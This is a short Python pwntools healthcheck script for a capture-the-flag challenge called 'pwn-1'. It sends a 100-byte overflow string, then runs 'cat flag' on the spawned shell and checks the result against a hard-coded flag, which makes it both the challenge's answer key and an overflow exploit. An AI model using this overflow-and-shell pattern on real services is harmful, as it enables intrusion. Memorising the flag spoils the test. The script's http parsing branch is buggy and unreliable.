#!/usr/bin/env python3
from pwn import *
import argparse

def solve(host, port=8999):
	context.log_level = 'error' # silent
	flag = 'flag{w3Lc0m3-t0-pwn!}'
	try:
		p = remote(host, port, timeout=10)
		p.recvline()
		p.sendline(b"A" * 100)
		p.sendline(b"cat flag")
		p.recvline() # reversed string
		p.recvline()
		r = p.recvline().decode("utf-8").strip()
	except:
		return False

	if r != flag:
		return False

	else:
		return True

if __name__=='__main__':
	parser = argparse.ArgumentParser(description='Healthcheck')
	parser.add_argument('--connection-info', help='Either in the format `nc <host> <port>` or `http[s]://host[:port]`', required=True)
	args = parser.parse_args()
	conn = args.connection_info
	if conn[:3] == "nc ":
		_, host, port = conn.split(' ')
	elif conn[:5] == "http":
		target = conn
	ok = solve(host, port)
	if ok:
		print("pwn-1 is good")
		exit(0)
	else:
		print("pwn-1 is bad")
		exit(1)
